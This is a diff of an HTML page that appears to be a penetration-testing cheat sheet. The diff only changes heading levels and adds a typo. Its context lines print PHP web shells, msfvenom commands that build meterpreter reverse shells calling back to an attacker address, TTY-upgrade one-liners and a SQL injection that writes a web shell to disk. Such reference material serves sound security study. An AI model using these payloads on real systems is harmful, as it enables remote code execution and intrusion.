@@ -35,16 +35,16 @@
         <li>	WinterMute 	</li> 
     </ul>
     <h2>Shells</h2>
-        <h3>PHP</h3>
+        <h4>PHP</h4>
             <pre style="font-size: medium;">
             &#60;?php system($_GET["cmd"]); ?&#62; 
             &#60;?php echo shell_exec($_GET["cmd"]); ?&#62; 
             </pre>
-    <h3>Reverse Shell </h3">
+    <h4>Reverse Shell </h4">
 
-        <p><a style="font-size: medium;" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Reverse-Shell-Cheat-Sheet</a></p>
+        <p><a syle="font-size: medium;" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Reverse-Shell-Cheat-Sheet</a></p>
     
-    <h3>Msfvenom</h3">
+    <h4>Msfvenom</h4">
             <pre style="font-size: medium;">
             #Linux
             msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f elf > shell.elf
@@ -60,7 +60,7 @@
             msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=445 -f exe -o shell_reverse.exe
             </pre>
 
-    <h3>Interactive TTY Shell</h3">
+    <h4>Interactive TTY Shell</h4">
             <pre style="font-size: medium;">
             # python
             python -c 'import pty; pty.spawn("/bin/sh")'
@@ -72,7 +72,7 @@
             /bin/bash -i
             </pre>
 
-    <h3>Shell From SQL Injection</h3">
+    <h4>Shell From SQL Injection</h4">
         <pre style="font-size: medium;">
             # windows
             ?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'
